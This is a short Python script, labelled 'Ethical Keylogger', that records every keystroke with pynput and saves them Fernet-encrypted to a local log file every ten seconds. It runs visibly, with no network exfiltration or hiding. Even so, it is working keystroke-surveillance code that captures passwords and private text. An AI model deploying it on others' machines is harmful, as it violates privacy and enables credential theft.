import pynput
from pynput.keyboard import Listener
import threading
import time
import os
from cryptography.fernet import Fernet

LOG_FILE = "keylog.txt"
KEY_FILE = "keylog.key"

def generate_key():
    if not os.path.exists(KEY_FILE):
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as f:
            f.write(key)

def load_key():
    return open(KEY_FILE, "rb").read()

def encrypt_log(data, key):
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data.encode())
    return encrypted

def save_encrypted_log(encrypted_data):
    with open(LOG_FILE, "ab") as f:
        f.write(encrypted_data + b"\n")

class Keylogger:
    def __init__(self):
        generate_key()
        self.key = load_key()
        self.log = ""
        self.listener = Listener(on_press=self.on_press)
        self.running = False

    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            if key == key.space:
                self.log += " "
            elif key == key.enter:
                self.log += "\n"
            else:
                self.log += f" [{key.name}] "

    def start(self):
        self.running = True
        self.listener.start()
        print("Keylogger started. Press Ctrl+C to stop.")
        try:
            while self.running:
                time.sleep(10)  # Save every 10 seconds
                if self.log:
                    encrypted = encrypt_log(self.log, self.key)
                    save_encrypted_log(encrypted)
                    self.log = ""
        except KeyboardInterrupt:
            print("\nKeylogger stopped.")
            self.stop()

    def stop(self):
        self.running = False
        self.listener.stop()

def main():
    print("Ethical Keylogger")
    keylogger = Keylogger()
    keylogger.start()

if __name__ == "__main__":
    main()
